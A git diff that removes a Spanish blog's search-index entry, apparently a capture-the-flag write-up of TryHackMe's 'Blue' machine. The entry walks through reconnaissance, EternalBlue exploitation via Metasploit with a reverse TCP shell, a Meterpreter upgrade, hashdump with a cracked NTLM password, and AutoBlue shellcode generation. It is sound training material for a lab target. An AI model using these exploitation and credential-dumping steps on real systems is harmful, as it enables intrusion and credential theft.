@@ -1,687 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Blue</title>
-    <url>/2025/01/09/Blue/</url>
-    <content><![CDATA[<h1 id="Introduccion"><a href="#Introduccion" class="headerlink" title="Introducción"></a>Introducción</h1><p>Bienvenidos a este humilde WriteUp sobre esta sencillita máquina Windows que nos será de utilidad para repasar conceptos básicos y la explotación de diferentes formas sobre la vulnerabilidad <strong>MS17-010</strong> o mayormente conocida como <strong>EternalBlue</strong>. Para que un sea un simple Write-up más hacer dos tipos de explotaciones, una automática con metasploit y otra manual, aunque para la manual tengo que recalcar que la máquina de tryhackme no está preparada para esto y en ciertas ocasiones tendremos problemas, en cambio, existe la misma máquina sin estos problemas en la plataforma hack the box(se necesita subscripción). También comentaros que veréis diferentes ips de “víctima” porque no lo he podido hacer todo de golpe o he tenido que reiniciar la máquina.</p>
-<h1 id="Montar-el-laboratorio"><a href="#Montar-el-laboratorio" class="headerlink" title="Montar el laboratorio"></a>Montar el laboratorio</h1><p>Hace tiempo escuche en un vídeo de S4vitar sobre el gran problema que tiene TryHackMe para ocultar las conexiones entre los diferentes dispositivos conectados a su VPN, no sé si en la actualidad esto estará solucionado, pero para asegurarnos os comparto un <a class="link"   href="https://github.com/Wh1teDrvg0n/safeVPN-THM" >recurso de Wh1teDrvg0n<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que son unas reglas para prohibir las conexiones entrantes no deseadas.</p>
-<p>Aseguraros de no tener reglas propias o alguna copia de estas porque al finalizar la máquina limpiaremos todas las reglas existentes.</p>
-<h2 id="Conexion-VPN"><a href="#Conexion-VPN" class="headerlink" title="Conexión VPN"></a>Conexión VPN</h2><ol>
-<li><p>Nos descargamos el archivo VPN, tu icono &gt; Access &gt; Selecciona el servidor VPN y te lo descargas. Puede que el servidor no funcione o no esté disponible, esto lo comprobarás si al lanzar la vpn no se conecta(se queda intentándolo todo el tiempo).</p>
-</li>
-<li><p>Lanzamos la VPN:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> openvpn user.ovpn</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-<h2 id="Configuracion-de-reglas-de-seguridad"><a href="#Configuracion-de-reglas-de-seguridad" class="headerlink" title="Configuración de reglas de seguridad."></a>Configuración de reglas de seguridad.</h2><p>Esta consola debéis de dejarla abierta para que la conexión no se muera.</p>
-<ol start="3">
-<li><p>Comprobamos que no exista ninguna regla:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -L -v -n</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/primera_comprobacion_ip_tables.png"
-                      alt="iptables vacío."
-                ><figcaption>iptables vacío.</figcaption></figure></p>
-</li>
-<li><p>Ejecutamos el script y comprobamos las reglas utilizando el comando anterior.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./safevpn-thm.sh ip_máquina_víctima</span><br></pre></td></tr></table></figure></div>
-<p>La ip indicada es la correspondiente con tun0, interfaz creada por la VPN.<br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/iptable_despues_del_script.png"
-                      alt="iptable después de ejecutar el script."
-                ><figcaption>iptable después de ejecutar el script.</figcaption></figure></p>
-</li>
-</ol>
-<p>Script para limpiar las reglas:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Limpiar reglas IPv4</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># Limpiar reglas IPv6</span></span><br><span class="line">ip6tables -t nat -F</span><br><span class="line">ip6tables -t mangle -F</span><br><span class="line">ip6tables -F</span><br><span class="line">ip6tables -X</span><br><span class="line">ip6tables -Z</span><br><span class="line">ip6tables -P INPUT ACCEPT</span><br><span class="line">ip6tables -P FORWARD ACCEPT</span><br><span class="line">ip6tables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Todas las reglas de iptables e ip6tables han sido eliminadas.&quot;</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="Estructura-de-directorios"><a href="#Estructura-de-directorios" class="headerlink" title="Estructura de directorios."></a>Estructura de directorios.</h2><p>Por último y no menos importante debemos de crear la estructura de directorios para almacenar la información relevante que vayamos obteniendo.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> &#123;recog,data,exploitation&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>Lanzamos la máquina en TryHackMe y cogemos la ip al vuelo.</p>
-<h1 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h1><p>TryHackMe nos facilita la labor y nos da la IP de la máquina realizada para ser explotada, como sabéis lo primero a realizar es comprobar si el host está activo.</p>
-<h2 id="Disponibilidad-del-host"><a href="#Disponibilidad-del-host" class="headerlink" title="Disponibilidad del host"></a>Disponibilidad del host</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 1 10.10.210.75</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Escaneo-con-nmap"><a href="#Escaneo-con-nmap" class="headerlink" title="Escaneo con nmap"></a>Escaneo con nmap</h2><p>Vamos a descubrir los puertos abiertos de la máquina:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --open -sS --min-rate 4500 -vvv -n -Pn 10.10.210.75 -oG allPorts</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/escaneo_puertos_nmap.png"
-                      alt="Escaneo de puertos con nmap."
-                ><figcaption>Escaneo de puertos con nmap.</figcaption></figure><br>Recuerda que puedes utilizar varias herramientas y comparar resultados, puedes encontrar algún dato extra.</p>
-<h2 id="Escaneo-con-netcat"><a href="#Escaneo-con-netcat" class="headerlink" title="Escaneo con netcat"></a>Escaneo con netcat</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -zv 10.10.210.75 1-1000</span><br></pre></td></tr></table></figure></div>
-
-<p>Tienes más cómo unicornscan, angryscan, un script en bash…</p>
-<h2 id="Extraccion-de-puertos-manual"><a href="#Extraccion-de-puertos-manual" class="headerlink" title="Extracción de puertos manual"></a>Extracción de puertos manual</h2><p>Para escanear los servicios y versiones de los puertos vamos a copiar los puertos en la clipboard, pero en este caso son muchos y no lo queremos copiar a mano podemos utilizar varias utilidades en un momento para ordenar y obtener solo el número de puertos del archivo grepeable extraido.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Ports:&quot;</span> allPorts | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tail</span> -n +4 | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed <span class="string">&#x27;s/.$//&#x27;</span> | xargs</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/extract_ports_manually.png"
-                      alt="Extracción de puertos manualmente."
-                ><figcaption>Extracción de puertos manualmente.</figcaption></figure></p>
-<ul>
-<li><strong>grep “Ports:” allPorts</strong>: Obtenemos la línea que contiene todos los puertos encontrados.</li>
-<li><strong>tr ‘ ‘ ‘\n’</strong>: Sustituimos los espacios por saltos de línea.</li>
-<li><strong>tail -n +4</strong>: Muestra todas las líneas menos las 4 primeras.</li>
-<li><strong>awk -F ‘&#x2F;‘ ‘{print $1}’</strong>: Indicas que el delimitador es ‘&#x2F;‘ y que quieres obtener el primer resultado.</li>
-<li><strong>tr ‘\n’ ‘,’</strong>: Sustituimos los saltos de línea por comas.</li>
-<li><strong>sed ‘s&#x2F;.$&#x2F;&#x2F;‘</strong>: Realizamos una sustitución(s -&gt; search and replace), el’.’ representa cualquier carácter, el $ representa el final de la línea y en la zona de remplazo(&#x2F;&#x2F;) no indicamos nada(entonces se elimina).</li>
-</ul>
-<h2 id="Escaneo-de-servicios-y-versiones"><a href="#Escaneo-de-servicios-y-versiones" class="headerlink" title="Escaneo de servicios y versiones"></a>Escaneo de servicios y versiones</h2><p>Escaneo de versión y servicios de los puertos:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sCV -p135,139,445,49152,49153,49154,49158,49160 10.10.197.255 -oN targeted</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/version_and_services_nmap.png"
-                      alt="Versión y servicios corriendo en dichos puertos."
-                ><figcaption>Versión y servicios corriendo en dichos puertos.</figcaption></figure></p>
-<p>Podemos encontrar alguna información como el nombre del equipo: Jon-PC, Windows 7 y diferentes versiones.</p>
-<p>A continuación vamos a ver si nos permite hacer uso de null session.</p>
-<h2 id="Comprobaciones-SMB-y-Null-Session"><a href="#Comprobaciones-SMB-y-Null-Session" class="headerlink" title="Comprobaciones SMB y Null Session"></a>Comprobaciones SMB y Null Session</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //10.10.210.75 -N</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/smbclient_null_session.png"
-                      alt="Uso de null session con smbclient."
-                ><figcaption>Uso de null session con smbclient.</figcaption></figure></p>
-<p>Podemos probar con smbmap, pero comprobamos que tampoco nos deja:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.210.75</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/smbmap_error.png"
-                      alt="Intento de conexión con smbmap."
-                ><figcaption>Intento de conexión con smbmap.</figcaption></figure></p>
-<p>Llegados a este punto podemos comprobar si existen vulnerabilidades existentes para este Windows 7. Para ello utilizaremos algunos script en nmap, estos están divididos en <strong>categorías</strong>:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">locate .nse | xargs grep <span class="string">&quot;categories&quot;</span> | grep -oP <span class="string">&#x27;&quot;.*?&quot;&#x27;</span> | <span class="built_in">sort</span> -u </span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/categorias_nmap.png"
-                      alt="Categorías sobre los scripts de nmap."
-                ><figcaption>Categorías sobre los scripts de nmap.</figcaption></figure></p>
-<p>Como es un Windows 7 y el smb esta expuesto comprobamos las vulnerabilidades(vuln) de forma no intrusiva(safe):</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p445 --script <span class="string">&quot;vuln and save&quot;</span> 10.10.197.255</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/detect_eternalblue_general_vuln_nmap.png"
-                      alt="Detección del eternal blue con nmap."
-                ><figcaption>Detección del eternal blue con nmap.</figcaption></figure></p>
-<p>Puedes indicar el script:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 445 --script smb-vuln-ms17-010 10.10.197.255</span><br></pre></td></tr></table></figure></div>
-
-<p>Puedes utilizar netexec(crackmapexec). Para instalarlo en arch he utilizado el siguiente comando:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pipx install git+https://github.com/Pennyw0rth/NetExec</span><br></pre></td></tr></table></figure></div>
-
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.197.255 -M ms17-010</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/netexec_eternalblue.png"
-                      alt="Utilizando netexec para comprobar si eternalblue existe."
-                ><figcaption>Utilizando netexec para comprobar si eternalblue existe.</figcaption></figure></p>
-<h1 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h1><h2 id="Explotacion-con-metasploit"><a href="#Explotacion-con-metasploit" class="headerlink" title="Explotación con metasploit"></a>Explotación con metasploit</h2><h3 id="Configuracion-inicial-del-exploit"><a href="#Configuracion-inicial-del-exploit" class="headerlink" title="Configuración inicial del exploit."></a>Configuración inicial del exploit.</h3><p>Para explotarlo tenemos diferentes maneras de hacerlo:</p>
-<p>Mediante metasploit:</p>
-<p>Para explotar eternal blue mediante metasploit tenemos que seguir una serie de pasos.</p>
-<ol>
-<li><p>Abrir metasploit con el comando <strong>msfoconsole</strong></p>
-</li>
-<li><p>Buscar por eternalblue: <strong>search eternalblue</strong>.</p>
-</li>
-</ol>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/search_eternalblue_metasploit.png"
-                      alt="Buscamos por eternalblue."
-                ><figcaption>Buscamos por eternalblue.</figcaption></figure></p>
-<ol start="3">
-<li>Copiamos el nombre del primero y indicamos que lo queremos usar:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></div></li>
-<li>Miramos cuáles son las opciones a rellenar para que el payload funcione correctamente:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-<p>En este caso, si nos fijamos tenemos que configurar todas las opciones que sean “yes” en Required, al menos que ya haya una configuración por defecto que coincida con nuestra información.</p>
-<ol start="5">
-<li>Seteamos el RHOST:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 10.10.114.58</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-<p>Si volvemos a ejecutar la orden show options, nos aparecerá la ip indicada, en caso de equivocarnos podemos utilizar el comando <strong>unset RHOSTS</strong></p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/show_parameters_value_eternalblue_metasploit.png"
-                      alt="Ip víctima seteada."
-                ><figcaption>Ip víctima seteada.</figcaption></figure></p>
-<ol start="6">
-<li><p>Indicamos LHOST(ya que por defecto utiliza la ip de otra interfaz). Está es la ip que nos da la vpn de tryhackme(tun0).</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST 10.21.60.116</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>Debemos de configurar un payload, esto es el código que se ejecuta en la víctima, normalmente para obtener acceso a ella usando alguna shell, depende de nuestras preferencias usaremos uno u otro(puedes ver los todos con el comando show payloads):</p>
-</li>
-</ol>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/shell/reverse_tcp</span><br></pre></td></tr></table></figure></div>
-
-<p>En este caso utilizo una reverse shell para que el equipo víctima me envia una shell a mí.</p>
-<ol start="8">
-<li>Ejecutamos el exploit con el comando <strong>run</strong> o <strong>exploit</strong>. En caso de que no funcione revisar que las direcciones esten correctas, que no haya ningun servicio utilizado en el puerto 4444 y a las malas(como fue mi caso) tuve que reiniciar la máquina víctima.</li>
-</ol>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/conectados_con_metasploit.png"
-                      alt="Conexión exitosa con metasploit."
-                ><figcaption>Conexión exitosa con metasploit.</figcaption></figure></p>
-<p>Ya podemos introducir comandos en el equipo víctima.</p>
-<p>Una vez aquí nos vamos a salir, para ello utilizamos el comando <strong>background</strong> o <strong>ctrl+z</strong>. Vamos a cambiar nuestra sesión reverse shell por una de tipo <strong>meterpreter</strong>, está sesión es la que se usa por defecto y en lugar de enfadarte y pensar que porque no he usado esta primero es para que nos familiaricemos con la herramienta metasploit.</p>
-<p>Meterpreter tiene algunas ventajas frente a la reverse shell cómo: </p>
-<ul>
-<li>Se carga en memoria.</li>
-<li>Capturas de pantalla.</li>
-<li>Registros de teclas..</li>
-<li>..</li>
-</ul>
-<h3 id="Cambio-de-reverse-shell-a-Meterpreter"><a href="#Cambio-de-reverse-shell-a-Meterpreter" class="headerlink" title="Cambio de reverse shell a Meterpreter"></a>Cambio de reverse shell a Meterpreter</h3><p>Bien, para cambiar de reverse shell a meterpreter vamos a seguir los siguientes pasos:</p>
-<ol>
-<li>Cambiamos al siguiente módulo: <strong>use post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong>2. Como antes vemos los parámetros a configurar: <strong>show options</strong>, en este caso solo debemos indicar el ID de la sesión que contiene la reverse shell.</li>
-<li>Para ver el ID de la sesión suspendida debemos utilizar <strong>sessions -l</strong>* y seguramente tenga el ID 1.</li>
-<li>Seteamos el parámetro: <strong>set SESSION 1</strong></li>
-<li>Ejecutamos: <strong>run</strong></li>
-<li>Al finalizar comprobamos nuestras sesiones y debe de aparecer una nueva sesión con meterpreter.</li>
-<li>Nos metemos a ella con el comando <strong>sessions -i 2</strong>(En mi caso con 3 porque cree otra sesión y elimine la 2).</li>
-</ol>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/sesiones_metasploit_cambio_de_reverse_shell_a_meterpreter.png"
-                      alt="Sesiones disponibles."
-                ><figcaption>Sesiones disponibles.</figcaption></figure></p>
-<p>Comandos y algunos extra.</p>
-<p><strong>session -i ID</strong>: Para conectarnos a la sesión.<br><strong>sessions -k ID</strong>: Para eliminar alguna sesión.<br><strong>sessions -K</strong>: Para eliminar todas las sesiones.</p>
-<p>Vamos a escalar privilegios de una forma muy sencilla con meterpreter, si utilizamos el comando <strong>help</strong> para ver los comandos que tenemos disponibles, vemos <strong>getsystem</strong> como bien pone en su descripción realiza un intento para escalar privilegios sobre el equipo, si este tiene éxito nos elevará a <strong>NT AUTHORITY\SYSTEM</strong>.</p>
-<p>Podemos hacer getuid para saber con que usuario estamos ahora y saldrá NT AUTHORITY\SYSTEM, esto es porque el servicio smb del que nos hemos aprovechado lo esta utilizando dicho usuario, aunque no tiene porque ser siempre así.</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/comprobacion_nt_authority_system_meterpreter.png"
-                      alt="Usuario NT AUTHORITY\SYSTEM."
-                ><figcaption>Usuario NT AUTHORITY\SYSTEM.</figcaption></figure></p>
-<p>Vamos a ver por encima el concepto de <strong>“migrar el proceso”</strong>, esto puede ser útil para obtener persistencia, para evadir una detección…</p>
-<p>Cuando migras a un proceso, tienes que ver que sea de NT AUTHORITY\SYSTEM(el mismo usuario) y que en la última columna de la derecha(la de path) <strong>no este vacía</strong>. Todo esto se puede ver con el comando:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure></div>
-
-<p>El comando sería:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">migrate PID</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>No se lo recomiendo hacer</strong> no suele ir muy bien, o no funciona en muchos procesos o la sesión se queda pillada y te tienes que salir, y luego no te deja volver a pasar la reverse shell a una sesión meterpreter, si paso esto recomiendo cerrar metasploit y establecer una conexión directamente con meterpreter.</p>
-<p>Para obtener el hash de los usuarios del sistema tenemos el comando <strong>hashdump</strong> en la sesión meterpreter.</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/hashdump_meterpreter.png"
-                      alt="Resultado de usar hashdump."
-                ><figcaption>Resultado de usar hashdump.</figcaption></figure></p>
-<p>Vamos a separar esto:</p>
-<ul>
-<li>Jon:1000: Nombre de usuario y el SID(Security Identifier)</li>
-<li>aad3b435b51404eeaad3b435b51404ee: La primera parte hasta los dos puntos es el <strong>hash LM</strong>. No nos sirve para nada porque ya no se usa.</li>
-<li>ffb43f0de35be4d9917ac0cc8ad57f8d: Esta segunda parte es el <strong>hash NTLM</strong></li>
-</ul>
-<p>Podemos utilizar diferentes herramientas para crackear dichos hashes NTLM:</p>
-<ul>
-<li>Crackstation: Página web con la que he podido sacar el hash NTLM de Jon.</li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/crackstation_ntlm_jon_hashdump.png"
-                     
-                ></p>
-<p>La contraseña de Jon es: <strong>alqfna22</strong></p>
-<p>Obtención de flags:</p>
-<p>La primera está en la raíz:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/primera_flag.png"
-                      alt="Obtención de la primera bandera."
-                ><figcaption>Obtención de la primera bandera.</figcaption></figure></p>
-<p>Segunda bandera en el directorio donde se almacenan las contraseñas:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Windows\\System32\\config</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/segunda_flag.png"
-                      alt="Obtención de la segunda flag."
-                ><figcaption>Obtención de la segunda flag.</figcaption></figure></p>
-<p>En la imagen da error porque ya estoy en dicho directorio, ejecute el comando sin querer.</p>
-<p>Tercera bandera, ‘Donde los administradores suelen guardar cosas interesantes.’.</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Users\\Jon\\Documents\\</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag3.txt</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/tercera_flag.png"
-                      alt="Resultado de la tercera flag."
-                ><figcaption>Resultado de la tercera flag.</figcaption></figure></p>
-<h2 id="Explotacion-manual"><a href="#Explotacion-manual" class="headerlink" title="Explotación manual"></a>Explotación manual</h2><h3 id="Uso-de-zzz-exploit"><a href="#Uso-de-zzz-exploit" class="headerlink" title="Uso de zzz exploit"></a>Uso de zzz exploit</h3><p>Es bueno saber como usar mestasploit ya que es considerada una herramienta muy pontente, aunque considero que no se debe de abusar de ella porque no ganariamos tanto conocimiento como realizar una <strong>explotación manual</strong>.</p>
-<p>Vamos a buscar un script en google <strong>ms17-010 zzz_exploit py</strong> de worawit.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</span><br></pre></td></tr></table></figure></div>
-<p>Este repositorio funciona mejor con <strong>python 2</strong>. Vamos a empezar ejecutando el script checker, ya sabéis que yo utilizo arch y debo de instalar un paquete(<strong>impacket</strong>) para poder ejecutar el script.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2-impacket</span><br></pre></td></tr></table></figure></div>
-
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 checker.py 10.10.115.185</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/preview_checker_zzz.png"
-                      alt="Preview del script checker."
-                ><figcaption>Preview del script checker.</figcaption></figure></p>
-<p>Si en alguno de las pipes te muestra información en lugar de status_access_denied significa que tenemos una forma potencial de ejecutar comandos, incluso ya soo con ver <strong>the target is not patched</strong>. Esto no significa que no deje, debemos <strong>modificar el script checker.py</strong> y indicar en el campo <strong>USERNAME</strong> el usuario <strong>guest</strong>:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/credenciales_guest_checker_zzz.png"
-                      alt="Indicamos el usuario guest en checker.py"
-                ><figcaption>Indicamos el usuario guest en checker.py</figcaption></figure></p>
-<p>Pero a continuación vemos que el usuario guest no está activado en la máquina víctima.<br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/error_guest_checker_zzz.png"
-                      alt="Error con el usuario guest."
-                ><figcaption>Error con el usuario guest.</figcaption></figure></p>
-<p>Puedes poner las credenciales del usuario encontrado con metasploit anteriormente y funcionaría:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/checker_despues_de_poner_credenciales.png"
-                      alt="Después de poner las credenciales."
-                ><figcaption>Después de poner las credenciales.</figcaption></figure></p>
-<h3 id="Uso-de-Autoblue"><a href="#Uso-de-Autoblue" class="headerlink" title="Uso de Autoblue"></a>Uso de Autoblue</h3><p>En la máquina de tryhackme no está activado el usuario guest(en la de hack the box sí), pero aún así podemos utilizar el script <a class="link"   href="https://github.com/3ndG4me/AutoBlue-MS17-010" >AutoBlue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Nos permite tener una mayor flexibilidad y retocar ciertas características que metasploit no permite. Este también tiene un checker y nos sale lo siguiente al ejecutarlo:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/autoblue_path_wordlists_not_found_checker.png"
-                      alt="Autoblue no encuentra los diccionarios."
-                ><figcaption>Autoblue no encuentra los diccionarios.</figcaption></figure></p>
-<p>Al intentar modificar el script para indicar la ruta veo que no se encuentra aquí, siguiendo el rastro, encuentro el problema en la función <strong>check_accesisible_pipes()</strong>, exactamente en la función de la conexión(conn.find_named_pipe), objeto creado por el módulo importado <strong>mysmb</strong>(más abajo se ve), una vez aquí dentro busco por el output que nos muestra al no encontrar el diccionario y encuentro la ruta:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/autoblue_change_path_checker.png"
-                      alt="Cambiamos la ruta en el script mysmb.py"
-                ><figcaption>Cambiamos la ruta en el script mysmb.py</figcaption></figure></p>
-<p>Ahora probamos a ejecutar el script de nuevo:<br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/autoblue_checker_ok.png"
-                      alt="Ejecucción exitosa del checker."
-                ><figcaption>Ejecucción exitosa del checker.</figcaption></figure></p>
-<p>Genial, parece que funciona, ahora debemos de dirigirnos al directorio shellcode y dentro encontraremos un script llamado <strong>shell_prep.sh</strong> que nos generará la carga, este nos realizará diferentes preguntas al ejecutarlo:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/autoblue_generate_shellcode.png"
-                      alt="Generando el shellcode."
-                ><figcaption>Generando el shellcode.</figcaption></figure></p>
-<ul>
-<li><p><strong>msfvenom</strong>: Herramienta para generar payloads, en este caso nuestra reverse shell.</p>
-</li>
-<li><p><strong>LHOST</strong>: Ip que recibe la shell, en este caso ponemos la del adaptador tun de la vpn.</p>
-</li>
-<li><p><strong>LPORT x64</strong>: puerto donde se envía la shell de x64 bits.</p>
-</li>
-<li><p><strong>LPORT x86</strong>: puerto donde se envía la shell de x86 bits.</p>
-</li>
